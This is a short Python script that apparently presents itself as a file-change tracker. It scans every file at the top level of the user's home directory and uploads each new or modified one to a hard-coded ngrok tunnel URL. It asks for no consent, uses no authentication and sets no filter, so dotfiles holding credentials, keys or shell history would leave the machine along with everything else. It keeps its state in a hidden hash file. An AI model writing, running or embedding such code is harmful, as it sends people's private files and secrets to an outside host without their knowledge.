import os
import hashlib
import json
import requests

UPLOAD_URL = "https://chug-frostbite-outthink.ngrok-free.dev/upload"
BASE_DIR = os.path.expanduser("~")
HASH_FILE = os.path.join(BASE_DIR, ".filehashes.json")

# Load previous hashes
if os.path.exists(HASH_FILE):
    with open(HASH_FILE, "r") as f:
        saved_hashes = json.load(f)
else:
    saved_hashes = {}

def get_file_hash(filepath):
    hasher = hashlib.sha256()
    with open(filepath, "rb") as f:
        while chunk := f.read(8192):
            hasher.update(chunk)
    return hasher.hexdigest()

def upload_file(filepath):
    with open(filepath, "rb") as f:
        files = {"file": (os.path.basename(filepath), f)}
        response = requests.post(UPLOAD_URL, files=files)
        print(f"Upload {filepath}: {response.status_code}")
        try:
            print(response.json())
        except:
            print(response.text)

def main():
    current_hashes = {}

    for filename in os.listdir(BASE_DIR):
        filepath = os.path.join(BASE_DIR, filename)

        # Only process files (no directories)
        if not os.path.isfile(filepath):
            continue

        # Skip the hash file itself
        if filepath == HASH_FILE:
            continue

        file_hash = get_file_hash(filepath)
        current_hashes[filepath] = file_hash

        # Check if new or modified
        if filepath not in saved_hashes:
            print(f"[NEW] {filepath}")
            upload_file(filepath)

        elif saved_hashes[filepath] != file_hash:
            print(f"[MODIFIED] {filepath}")
            upload_file(filepath)

        else:
            print(f"[UNCHANGED] {filepath}")

    # Save updated hashes
    with open(HASH_FILE, "w") as f:
        json.dump(current_hashes, f, indent=2)

if __name__ == "__main__":
    main()
